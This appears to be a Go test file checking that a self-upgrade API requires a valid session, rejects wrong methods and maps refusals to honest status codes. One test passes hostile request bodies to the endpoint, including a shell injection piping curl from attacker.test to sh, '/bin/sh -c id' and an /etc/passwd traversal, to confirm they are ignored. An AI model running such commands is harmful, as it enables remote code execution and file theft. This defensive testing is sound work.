package api

import (
	"context"
	"errors"
	"fmt"
	"net/http"
	"net/http/httptest"
	"strings"
	"sync/atomic"
	"testing"
	"time"

	"github.com/OberWatch/oberwatch/internal/storage"
	"github.com/OberWatch/oberwatch/internal/upgrade"
)

// fakeUpgradeManager stands in for upgrade.Manager so the API tests never touch
// the network, a real handoff directory or a real binary.
//
//nolint:govet // Keep the fake grouped by what it stands in for.
type fakeUpgradeManager struct {
	status   upgrade.Status
	prepared upgrade.Version
	err      error
	calls    atomic.Int64
}

func (f *fakeUpgradeManager) Status(context.Context) upgrade.Status {
	return f.status
}

func (f *fakeUpgradeManager) Prepare(context.Context) (upgrade.Version, error) {
	f.calls.Add(1)
	return f.prepared, f.err
}

func mustVersion(t *testing.T, raw string) upgrade.Version {
	t.Helper()

	version, err := upgrade.ParseVersion(raw)
	if err != nil {
		t.Fatalf("ParseVersion(%q) error = %v", raw, err)
	}
	return version
}

// newUpgradeTestServer returns a server whose upgrade behaviour is the fake.
func newUpgradeTestServer(t *testing.T, fake *fakeUpgradeManager) (*Server, storage.Store) {
	t.Helper()

	server, _, store := newTestServer(t)
	server.upgrader = fake
	return server, store
}

func TestServer_UpgradeEndpointsRequireASession(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name           string
		method         string
		path           string
		wantAuthorized int
	}{
		{name: "upgrade status", method: http.MethodGet, path: basePath + "/upgrade/status", wantAuthorized: http.StatusOK},
		{name: "start upgrade", method: http.MethodPost, path: basePath + "/upgrade", wantAuthorized: http.StatusAccepted},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()

			fake := &fakeUpgradeManager{
				status:   upgrade.Status{CurrentVersion: "v0.1.3", LatestVersion: "v0.1.4", UpdateAvailable: true, Supported: true},
				prepared: mustVersion(t, "v0.1.4"),
			}
			server, store := newUpgradeTestServer(t, fake)

			anonymous := httptest.NewRequest(tt.method, tt.path, nil)
			recorder := httptest.NewRecorder()
			server.ServeHTTP(recorder, anonymous)
			if recorder.Code != http.StatusUnauthorized {
				t.Fatalf("unauthenticated %s %s = %d, want %d", tt.method, tt.path, recorder.Code, http.StatusUnauthorized)
			}
			if fake.calls.Load() != 0 {
				t.Fatal("an unauthenticated request reached the upgrade manager")
			}

			expired := httptest.NewRequest(tt.method, tt.path, nil)
			expired.AddCookie(&http.Cookie{Name: sessionCookieName, Value: seedSession(t, store, time.Now().UTC().Add(-time.Hour))})
			recorder = httptest.NewRecorder()
			server.ServeHTTP(recorder, expired)
			if recorder.Code != http.StatusUnauthorized {
				t.Fatalf("expired-session %s %s = %d, want %d", tt.method, tt.path, recorder.Code, http.StatusUnauthorized)
			}
			if fake.calls.Load() != 0 {
				t.Fatal("a request with an expired session reached the upgrade manager")
			}

			wrongToken := httptest.NewRequest(tt.method, tt.path, nil)
			seedSession(t, store, time.Now().UTC().Add(time.Hour))
			wrongToken.AddCookie(&http.Cookie{Name: sessionCookieName, Value: "not-the-session-token"})
			recorder = httptest.NewRecorder()
			server.ServeHTTP(recorder, wrongToken)
			if recorder.Code != http.StatusUnauthorized {
				t.Fatalf("wrong-token %s %s = %d, want %d", tt.method, tt.path, recorder.Code, http.StatusUnauthorized)
			}

			authorized := httptest.NewRequest(tt.method, tt.path, nil)
			addAuthenticatedSessionCookie(t, store, authorized)
			recorder = httptest.NewRecorder()
			server.ServeHTTP(recorder, authorized)
			if recorder.Code != tt.wantAuthorized {
				t.Fatalf("authenticated %s %s = %d, want %d: %s", tt.method, tt.path, recorder.Code, tt.wantAuthorized, recorder.Body.String())
			}
		})
	}
}

func TestIsPublicEndpoint_ExcludesTheUpgradeEndpoints(t *testing.T) {
	t.Parallel()

	for _, path := range []string{basePath + "/upgrade", basePath + "/upgrade/status"} {
		if isPublicEndpoint(path) {
			t.Errorf("isPublicEndpoint(%q) = true; the upgrade endpoints must always require a session", path)
		}
	}
}

func TestServer_UpgradeEndpointsRejectWrongMethods(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name   string
		method string
		path   string
	}{
		{name: "post to status", method: http.MethodPost, path: basePath + "/upgrade/status"},
		{name: "put to status", method: http.MethodPut, path: basePath + "/upgrade/status"},
		{name: "delete to status", method: http.MethodDelete, path: basePath + "/upgrade/status"},
		{name: "get to upgrade", method: http.MethodGet, path: basePath + "/upgrade"},
		{name: "put to upgrade", method: http.MethodPut, path: basePath + "/upgrade"},
		{name: "delete to upgrade", method: http.MethodDelete, path: basePath + "/upgrade"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()

			fake := &fakeUpgradeManager{prepared: mustVersion(t, "v0.1.4")}
			server, store := newUpgradeTestServer(t, fake)

			req := httptest.NewRequest(tt.method, tt.path, nil)
			addAuthenticatedSessionCookie(t, store, req)
			recorder := httptest.NewRecorder()
			server.ServeHTTP(recorder, req)

			if recorder.Code != http.StatusMethodNotAllowed {
				t.Fatalf("%s %s = %d, want %d", tt.method, tt.path, recorder.Code, http.StatusMethodNotAllowed)
			}
			if fake.calls.Load() != 0 {
				t.Fatalf("%s %s reached the upgrade manager", tt.method, tt.path)
			}
		})
	}
}

// The upgrade endpoint has no parameters. A body that names a version, a tag, a
// URL, an archive, a path or a command must have no effect at all: the version
// installed is the one the server's own release check returned.
func TestServer_Upgrade_IgnoresEverythingInTheRequestBody(t *testing.T) {
	t.Parallel()

	bodies := []struct {
		name string
		body string
	}{
		{name: "another tag", body: `{"tag":"v9.9.9"}`},
		{name: "a version field", body: `{"version":"v9.9.9"}`},
		{name: "a download url", body: `{"url":"https://attacker.test/payload.tar.gz"}`},
		{name: "an archive path", body: `{"archive":"/tmp/attacker.tar.gz"}`},
		{name: "an install path", body: `{"install_path":"/usr/bin/sudo"}`},
		{name: "a command", body: `{"command":"/bin/sh -c id"}`},
		{name: "a traversal", body: `{"tag":"../../../etc/passwd"}`},
		{name: "a shell fragment", body: `{"tag":"v0.1.4; curl attacker.test | sh"}`},
		{name: "a checksum override", body: `{"sha256":"` + strings.Repeat("0", 64) + `"}`},
		{name: "a state directory override", body: `{"state_dir":"/etc/systemd/system"}`},
		{name: "not json at all", body: `tag=v9.9.9`},
		{name: "an empty body", body: ``},
	}

	for _, tt := range bodies {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()

			fake := &fakeUpgradeManager{prepared: mustVersion(t, "v0.1.4")}
			server, store := newUpgradeTestServer(t, fake)

			req := httptest.NewRequest(http.MethodPost, basePath+"/upgrade", strings.NewReader(tt.body))
			addAuthenticatedSessionCookie(t, store, req)
			recorder := httptest.NewRecorder()
			server.ServeHTTP(recorder, req)

			if recorder.Code != http.StatusAccepted {
				t.Fatalf("status code = %d, want %d: %s", recorder.Code, http.StatusAccepted, recorder.Body.String())
			}

			payload := decodeJSONMap(t, recorder.Result().Body)
			if payload["tag"] != "v0.1.4" {
				t.Fatalf("tag = %v, want the version the release check returned", payload["tag"])
			}
			body := recorder.Body.String()
			for _, forbidden := range []string{"v9.9.9", "attacker.test", "/usr/bin/sudo", "/bin/sh", "/etc/passwd", "/etc/systemd/system"} {
				if strings.Contains(body, forbidden) {
					t.Fatalf("response echoed %q from the request body: %s", forbidden, body)
				}
			}
		})
	}
}

func TestServer_Upgrade_ExplainsRestartAndRollbackOnSuccess(t *testing.T) {
	t.Parallel()

	fake := &fakeUpgradeManager{prepared: mustVersion(t, "v0.1.4")}
	server, store := newUpgradeTestServer(t, fake)

	req := httptest.NewRequest(http.MethodPost, basePath+"/upgrade", nil)
	addAuthenticatedSessionCookie(t, store, req)
	recorder := httptest.NewRecorder()
	server.ServeHTTP(recorder, req)

	if recorder.Code != http.StatusAccepted {
		t.Fatalf("status code = %d, want %d", recorder.Code, http.StatusAccepted)
	}

	payload := decodeJSONMap(t, recorder.Result().Body)
	message, ok := payload["message"].(string)
	if !ok {
		t.Fatalf("message type = %T, want string", payload["message"])
	}
	for _, phrase := range []string{"verified", "restarts", "unavailable", "Configuration and data are not changed", "rollback"} {
		if !strings.Contains(message, phrase) {
			t.Errorf("message = %q, want it to state %q", message, phrase)
		}
	}
	if payload["status"] != "applying" {
		t.Errorf("status = %v, want applying", payload["status"])
	}
}

func TestServer_Upgrade_MapsRefusalsOntoHonestStatusCodes(t *testing.T) {
	t.Parallel()

	//nolint:govet // Keep table fields grouped by refusal, then expectation.
	tests := []struct {
		name       string
		err        error
		wantStatus int
		wantCode   string
	}{
		{
			name:       "unsupported installation",
			err:        fmt.Errorf("%w: no privileged applier", upgrade.ErrUnsupported),
			wantStatus: http.StatusConflict,
			wantCode:   "upgrade_unsupported",
		},
		{
			name:       "nothing newer to install",
			err:        fmt.Errorf("%w: running v0.1.4", upgrade.ErrNoUpdate),
			wantStatus: http.StatusConflict,
			wantCode:   "upgrade_not_available",
		},
		{
			name:       "an upgrade is already running",
			err:        upgrade.ErrInProgress,
			wantStatus: http.StatusConflict,
			wantCode:   "upgrade_in_progress",
		},
		{
			name:       "the archive failed verification",
			err:        fmt.Errorf("archive: %w", upgrade.ErrChecksumMismatch),
			wantStatus: http.StatusBadGateway,
			wantCode:   "upgrade_verification_failed",
		},
		{
			name:       "the archive is not listed in the checksums",
			err:        fmt.Errorf("archive: %w", upgrade.ErrChecksumMissing),
			wantStatus: http.StatusBadGateway,
			wantCode:   "upgrade_verification_failed",
		},
		{
			name:       "the release source is unreachable",
			err:        fmt.Errorf("%w: timeout", upgrade.ErrReleaseUnavailable),
			wantStatus: http.StatusServiceUnavailable,
			wantCode:   "upgrade_source_unavailable",
		},
		{
			name:       "the artifact is unavailable",
			err:        fmt.Errorf("%w: 404", upgrade.ErrArtifactUnavailable),
			wantStatus: http.StatusServiceUnavailable,
			wantCode:   "upgrade_source_unavailable",
		},
		{
			name:       "the artifact is over the size bound",
			err:        fmt.Errorf("%w: too big", upgrade.ErrArtifactTooLarge),
			wantStatus: http.StatusServiceUnavailable,
			wantCode:   "upgrade_source_unavailable",
		},
		{
			name:       "anything else",
			err:        errors.New("disk full"),
			wantStatus: http.StatusInternalServerError,
			wantCode:   "upgrade_failed",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()

			fake := &fakeUpgradeManager{err: tt.err}
			server, store := newUpgradeTestServer(t, fake)

			req := httptest.NewRequest(http.MethodPost, basePath+"/upgrade", nil)
			addAuthenticatedSessionCookie(t, store, req)
			recorder := httptest.NewRecorder()
			server.ServeHTTP(recorder, req)

			if recorder.Code != tt.wantStatus {
				t.Fatalf("status code = %d, want %d: %s", recorder.Code, tt.wantStatus, recorder.Body.String())
			}

			payload := decodeJSONMap(t, recorder.Result().Body)
			errorBody, ok := payload["error"].(map[string]any)
			if !ok {
				t.Fatalf("error type = %T, want an object", payload["error"])
			}
			if errorBody["code"] != tt.wantCode {
				t.Fatalf("error code = %v, want %q", errorBody["code"], tt.wantCode)
			}
			if message, _ := errorBody["message"].(string); strings.TrimSpace(message) == "" {
				t.Fatal("error message is empty; a refusal has to say why")
			}
		})
	}
}

func TestServer_UpgradeStatus_EncodesWhatTheDashboardNeeds(t *testing.T) {
	t.Parallel()

	checkedAt := time.Date(2026, 8, 28, 12, 0, 0, 0, time.UTC)

	//nolint:govet // Keep table fields grouped by status, then assertion.
	tests := []struct {
		name   string
		status upgrade.Status
		assert func(t *testing.T, payload map[string]any)
	}{
		{
			name: "an available update on a supported installation",
			status: upgrade.Status{
				CurrentVersion:  "v0.1.3",
				LatestVersion:   "v0.1.4",
				UpdateAvailable: true,
				CheckedAt:       &checkedAt,
				Supported:       true,
			},
			assert: func(t *testing.T, payload map[string]any) {
				if payload["current_version"] != "v0.1.3" || payload["latest_version"] != "v0.1.4" {
					t.Fatalf("payload = %v, want v0.1.3 -> v0.1.4", payload)
				}
				if payload["update_available"] != true || payload["supported"] != true {
					t.Fatalf("payload = %v, want an available, supported update", payload)
				}
				if payload["checked_at"] != "2026-08-28T12:00:00Z" {
					t.Fatalf("checked_at = %v, want RFC3339", payload["checked_at"])
				}
				if _, found := payload["fallback"]; found {
					t.Fatal("a supported installation must not carry a fallback instruction")
				}
			},
		},
		{
			name: "no check has completed yet",
			status: upgrade.Status{
				CurrentVersion: "v0.1.3",
				Supported:      true,
			},
			assert: func(t *testing.T, payload map[string]any) {
				if _, found := payload["checked_at"]; found {
					t.Fatal("checked_at is present before any check completed")
				}
				if _, found := payload["latest_version"]; found {
					t.Fatal("latest_version is present before any check completed")
				}
				if payload["update_available"] != false {
					t.Fatal("update_available is true before any check completed")
				}
			},
		},
		{
			name: "the release check failed",
			status: upgrade.Status{
				CurrentVersion: "v0.1.3",
				CheckError:     "release check unavailable: timeout",
				Supported:      true,
			},
			assert: func(t *testing.T, payload map[string]any) {
				if payload["check_error"] != "release check unavailable: timeout" {
					t.Fatalf("check_error = %v, want the real reason", payload["check_error"])
				}
				if payload["update_available"] != false {
					t.Fatal("update_available is true after a failed check")
				}
			},
		},
		{
			name: "an unsupported installation carries the fallback",
			status: upgrade.Status{
				CurrentVersion:    "v0.1.3",
				LatestVersion:     "v0.1.4",
				UpdateAvailable:   true,
				CheckedAt:         &checkedAt,
				Supported:         false,
				UnsupportedReason: "running in a container (/.dockerenv)",
				Fallback:          upgrade.ContainerFallback,
			},
			assert: func(t *testing.T, payload map[string]any) {
				if payload["supported"] != false {
					t.Fatal("supported is true for a container install")
				}
				if payload["unsupported_reason"] != "running in a container (/.dockerenv)" {
					t.Fatalf("unsupported_reason = %v", payload["unsupported_reason"])
				}
				if payload["fallback"] != upgrade.ContainerFallback {
					t.Fatalf("fallback = %v, want the container instruction", payload["fallback"])
				}
			},
		},
		{
			name: "an upgrade is in progress",
			status: upgrade.Status{
				CurrentVersion: "v0.1.3",
				Supported:      true,
				InProgress:     true,
			},
			assert: func(t *testing.T, payload map[string]any) {
				if payload["in_progress"] != true {
					t.Fatal("in_progress is false while an upgrade is being prepared")
				}
			},
		},
		{
			name: "the previous attempt's outcome",
			status: upgrade.Status{
				CurrentVersion: "v0.1.4",
				Supported:      true,
				LastResult: &upgrade.Result{
					Status:     upgrade.ResultSucceeded,
					Tag:        "v0.1.4",
					From:       "v0.1.3",
					Message:    "Installed v0.1.4 and restarted oberwatch.",
					FinishedAt: "2026-08-28T12:00:05Z",
				},
			},
			assert: func(t *testing.T, payload map[string]any) {
				result, ok := payload["last_result"].(map[string]any)
				if !ok {
					t.Fatalf("last_result type = %T, want an object", payload["last_result"])
				}
				if result["status"] != "succeeded" || result["tag"] != "v0.1.4" || result["from"] != "v0.1.3" {
					t.Fatalf("last_result = %v", result)
				}
				if result["finished_at"] != "2026-08-28T12:00:05Z" {
					t.Fatalf("last_result.finished_at = %v", result["finished_at"])
				}
			},
		},
		{
			name: "a failed previous attempt",
			status: upgrade.Status{
				CurrentVersion: "v0.1.3",
				Supported:      true,
				LastResult: &upgrade.Result{
					Status:  upgrade.ResultFailed,
					Tag:     "v0.1.4",
					Message: "checksum mismatch. Nothing was installed.",
				},
			},
			assert: func(t *testing.T, payload map[string]any) {
				result, ok := payload["last_result"].(map[string]any)
				if !ok {
					t.Fatalf("last_result type = %T, want an object", payload["last_result"])
				}
				if result["status"] != "failed" {
					t.Fatalf("last_result.status = %v, want failed", result["status"])
				}
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()

			server, store := newUpgradeTestServer(t, &fakeUpgradeManager{status: tt.status})

			req := httptest.NewRequest(http.MethodGet, basePath+"/upgrade/status", nil)
			addAuthenticatedSessionCookie(t, store, req)
			recorder := httptest.NewRecorder()
			server.ServeHTTP(recorder, req)

			if recorder.Code != http.StatusOK {
				t.Fatalf("status code = %d, want %d: %s", recorder.Code, http.StatusOK, recorder.Body.String())
			}
			tt.assert(t, decodeJSONMap(t, recorder.Result().Body))
		})
	}
}

func TestServer_UpgradeEndpointsReportAMissingManagerHonestly(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name   string
		method string
		path   string
	}{
		{name: "status", method: http.MethodGet, path: basePath + "/upgrade/status"},
		{name: "start", method: http.MethodPost, path: basePath + "/upgrade"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()

			server, _, store := newTestServer(t)
			server.upgrader = nil

			req := httptest.NewRequest(tt.method, tt.path, nil)
			addAuthenticatedSessionCookie(t, store, req)
			recorder := httptest.NewRecorder()
			server.ServeHTTP(recorder, req)

			if recorder.Code != http.StatusInternalServerError {
				t.Fatalf("status code = %d, want %d", recorder.Code, http.StatusInternalServerError)
			}
		})
	}
}

func TestNew_WiresAnUpgradeManagerForTheRunningVersion(t *testing.T) {
	t.Parallel()

	server, _, _ := newTestServer(t)
	if server.upgrader == nil {
		t.Fatal("New() left the upgrade manager unset, so the dashboard could never report a version check")
	}

	// The real manager is asserted directly rather than through Status, which
	// would start a release check: no unit test may reach the network.
	manager, ok := server.upgrader.(*upgrade.Manager)
	if !ok {
		t.Fatalf("New() wired a %T, want *upgrade.Manager", server.upgrader)
	}
	if manager.CurrentVersion() != server.version {
		t.Fatalf("manager version = %q, want the running version %q", manager.CurrentVersion(), server.version)
	}
	if manager.Environment().Supported {
		t.Error("a machine with no provisioned handoff directory was reported as supporting in-dashboard upgrades")
	}
}
